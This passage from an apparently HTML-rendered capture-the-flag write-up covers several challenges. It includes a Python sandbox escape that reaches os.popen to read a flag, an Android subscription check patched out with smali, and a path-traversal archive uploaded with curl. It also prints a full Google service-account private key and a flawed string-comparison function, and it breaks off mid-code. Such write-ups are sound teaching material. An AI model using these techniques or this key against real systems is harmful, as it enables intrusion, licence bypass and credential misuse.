&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;client_id&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;105494657484877589161&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;private_key&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;-----BEGIN PRIVATE KEY-----&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDEH&#x2F;WQiLjqB2nn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;cMc+fBOMbq3SE75vkj9EqNWi+ilk+ChphklRGsGcVeFsuPp06WjN1d&#x2F;knWw&#x2F;f+0M&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;PY3tli2oQIHuqLH5GIkVhm&#x2F;xpdgZUbskO8EjSI3eIs+qCMcfObgeFSw7T29PorC3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;IuQDPTfIgo4oHA7UlEBE8mZVUnEXFDh&#x2F;5sNFa+UzUE1QqpWymdRVhDHekxz0erWM&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;c67Ovxti40X4LnSvHOBjinjMDdtmvXBel0mIzUQxjLp6hmTPoKD7PKUodSN2QaKA&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;m+pQ6deWr5QvXTBc5XEXKpMnZnn4KqouJSic7jWGAOxY1iy&#x2F;We4OWeUWDYiFBxZu&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;Ze+IZSL5AgMBAAECggEAGg1Kv9fBhGjWswUimlS9&#x2F;gYHteOkhMqO9+5bboo&#x2F;bGeg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;aqAJZiohNMSdrKUHs&#x2F;b7UnhKBOK6adby5JDapQgxaWukNtEWzwlo0ECq5xUKFxbp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;vn7ngWnWWn8SSbpfxPCUWf6jAP&#x2F;kv9XTFoiedCWyHsLk4kQT3j4RKXdvi37ngdKU&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;e+CTFCDIlSr7Q2MdcKMql8lRkjcW0kvY9w8+gVXbgl4M3bNMru2JlxNn2scaGXg0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;n&#x2F;GbifMvbxYguCKhgTNH+t0N8vilVO8qUInvSDzQMSEZEycjxlsUgIAvrRy6QXT0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;4S1TbIARnrFC0g4zY0mg1EycuhO3OyeiM2KTweY7rwKBgQD3Kp2J6YsK2RuwktLb&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;1pC2o0jYuOMSGCsjULzeqYkXHpmFY7iojd&#x2F;g8FStPdJ+BanqcsZIUQf07zUxk5Xb&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;DdwH+9Q2QpQahRc6GhwcySd3v79ZaAkZAO3r&#x2F;QjF0OPLRLyvRXR8R5g25LYXL8Yk&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;nLbAGfcVjyW5XGCZOsmnu72+9wKBgQDLIloXEJJjwa+QTnBhmkOv922q0sVRLOUY&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;uj621qt09hgMTztepFsysBjJmDtAMOJpQott1G2m0wVkk7zdzmPFUvOMDc9&#x2F;54y8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;iqmBvoMBSLgWElp1vXvW7ICED&#x2F;d11m6aOwIVKJvJtHvS5seAd8TzHSy+5FUPjG5m&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;aS5psPuBjwKBgQDtTtpBDp00Bi2iw+V1szXwVSfdBO7ncZMBbkRYmHgKXZPS0WL7&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;WnRoWPdD+kZ+PtvcQOSFjF9SWNU+y0+nKVBnze77RcNDDyO04lq5fJzLSavjoJKT&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;kiPdX22r2BrOECoFMm9b37WShtcZvgHFJz4DhSqJZY43wSzyEdKJnCTbEwKBgQDE&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;z6ar3DGJl5pLXcRCvJ1CO5+0t3vYF4Bsgd7LdZgvvVQ1cPrbyrBVnwqVH&#x2F;qgSfzD&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;8WZ35i7LSH9cIEwIN7Sw9ZrkomjdyvGvp0VuYLA7KUK6l9OvagQ3i3NFANdJA5ar&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;tephp7OxLT4fa9v1m5Vl22mEFmRXqT852ETQwFod&#x2F;wKBgAgHdxxm1anORWoZVMhZ&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;DgWAhJSWsYv1HPPx18NTwVt0GxBA+ssvg8ET7zDXd5E1vay533SaV4pk&#x2F;w2mWsZU&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;lbfS&#x2F;vMslyg9GPpaKmhGVi6d3jr0xjgh5Vs72WCo2lAXvHwZNslB20SCmUzdP4nU&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;rwrzx7aO6kKU+DHb9EoEN+LI&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;-----END PRIVATE KEY-----&lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;private_key_id&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;722d66d6da8d6d5356d73d04d9366a76c7ada494&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;project_id&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;project-multivision&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;token_uri&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;https:&#x2F;&#x2F;oauth2.googleapis.com&#x2F;token&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;type&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;service_account&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;We can use the above json file to obtain a token that allows us to fetch the file. &lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;SCOPES &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;https:&#x2F;&#x2F;www.googleapis.com&#x2F;auth&#x2F;cloud-platform&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;, 
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;https:&#x2F;&#x2F;www.googleapis.com&#x2F;auth&#x2F;documents.readonly&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;SERVICE_ACCOUNT_FILE &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;adc.json&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;google.auth
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;google.auth.transport.requests
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;google.oauth2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;service_account
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;cred &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;service_account.Credentials.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;from_service_account_file&lt;&#x2F;span&gt;&lt;span&gt;(
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;SERVICE_ACCOUNT_FILE&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;scopes&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;SCOPES&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;auth_req &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;google.auth.transport.requests.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;Request&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;cred.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;refresh&lt;&#x2F;span&gt;&lt;span&gt;(auth_req)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(cred)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(cred.token)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;We can then fill the missing &lt;code&gt;get_token()&lt;&#x2F;code&gt; function in &lt;code&gt;backup.py&lt;&#x2F;code&gt; to fetch the file, which contains the flag.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;ep003ch02&quot;&gt;EP003CH02&lt;&#x2F;h2&gt;
&lt;p&gt;We have a fun game in the terminal. It&#x27;s quite hard to beat though. The goal of the game is to obtain a password. However, the Konami code works as a password, so we can skip the game. 
We end up in a pyjail that has a line length limit, too.&lt;&#x2F;p&gt;
&lt;p&gt;First, we locate &lt;code&gt;os._wrap_close&lt;&#x2F;code&gt; by just playing with commands like this:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;.__class__.__mro__[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;].&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;__subclasses__&lt;&#x2F;span&gt;&lt;span&gt;()[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;125&lt;&#x2F;span&gt;&lt;span&gt;:])
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Then, we must get creative to bypass the line length limit. 
There is a &lt;code&gt;config&lt;&#x2F;code&gt; object with a &lt;code&gt;__setattr__&lt;&#x2F;code&gt; method. This allows us to store things.
Thus, we do&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(config.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;__setattr__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;a&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;.__class__.__mro__[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;].&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;__subclasses__&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(config.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;__setattr__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;b&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;, config.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;()[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;132&lt;&#x2F;span&gt;&lt;span&gt;].&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;.__globals__))
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(config.b[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;popen&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;](&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;cat flag&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;to get the flag.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;ep003ch03&quot;&gt;EP003CH03&lt;&#x2F;h2&gt;
&lt;p&gt;Android application that can be used to scan a QR code. However, it won&#x27;t give us the flag unless we are subscribed.&lt;&#x2F;p&gt;
&lt;p&gt;With &lt;code&gt;apktool d&lt;&#x2F;code&gt; we can decompile the challenge.
Then, we just patch the &lt;code&gt;.smali&lt;&#x2F;code&gt; file containing the &lt;code&gt;isSubscribed()&lt;&#x2F;code&gt; method to return True.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#181818;color:#c4c4c4;&quot;&gt;&lt;code&gt;&lt;span&gt;.method public static final isSubscribed()Z
&lt;&#x2F;span&gt;&lt;span&gt;    .locals 1
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    .line 24
&lt;&#x2F;span&gt;&lt;span&gt;    const v0, true
&lt;&#x2F;span&gt;&lt;span&gt;    return v0
&lt;&#x2F;span&gt;&lt;span&gt;.end method
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;We use &lt;code&gt;apktool b&lt;&#x2F;code&gt; to build this, and then sign it with 
&lt;code&gt;uber-apk-signer&lt;&#x2F;code&gt;. Scan the QR code, get the flag.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;ep004ch01&quot;&gt;EP004CH01&lt;&#x2F;h2&gt;
&lt;p&gt;Skip this one until you have obtained source code for the challenge through EP004CH03.
Then, we can figure out what to send to the import endpoint. &lt;&#x2F;p&gt;
&lt;p&gt;Using &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ptoomey3&#x2F;evilarc&quot;&gt;ptoomey3&#x2F;evilarc&lt;&#x2F;a&gt;, we construct an archive that cotains a file with directory traversal characters in its path. i.e. a file like &lt;code&gt;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;The import endpoint notices that the file exists and gives us a diff, containing the flag.
The correct URL parameters were obtained through source code for &lt;code&gt;app.go&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#181818;color:#c4c4c4;&quot;&gt;&lt;code&gt;&lt;span&gt;curl -v -F &amp;#39;attachments=@evil.tar.gz&amp;#39; &amp;#39;https:&#x2F;&#x2F;path-less-traversed-web.h4ck.ctfcom
&lt;&#x2F;span&gt;&lt;span&gt;petition.com&#x2F;import?debug=true&amp;amp;submission=sample_submission&amp;amp;dryRun=false&amp;#39;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;ep004ch02&quot;&gt;EP004CH02&lt;&#x2F;h2&gt;
&lt;p&gt;The vulnerability is in the following function in the application&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;&#x2F;**
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt; * Checks if the given strings are identical. Runs in constant time and it
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt; * should be invulnerable from timing attacks.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt; * 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt; * Reference: https:&#x2F;&#x2F;www.chosenplaintext.ca&#x2F;articles&#x2F;beginners-guide-constant-time-cryptography.html
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt; * 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt; * @param {string} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;a
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt; * @param {string} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;b
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt; * @returns a boolean indicating if the strings are equal.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt; *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;safeEqual&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    let &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;match &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;.length &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;!== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span&gt;.length) {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;match &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;false&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    const &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;l &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;.length;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;(let &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;l&lt;&#x2F;span&gt;&lt;span&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;++&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;match &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;&amp;amp;&amp;amp;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;indexOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;i&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;=== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;indexOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;i&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;match&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c1bb71;&quot;&gt;module&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c1bb71;&quot;&gt;exports &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;safeEqual
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This function is used in the login flow of the application, in &lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;&#x2F;**
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt; * Finds a user by username and password.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt; * @param {string} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;username
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt; * @param {string} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;password
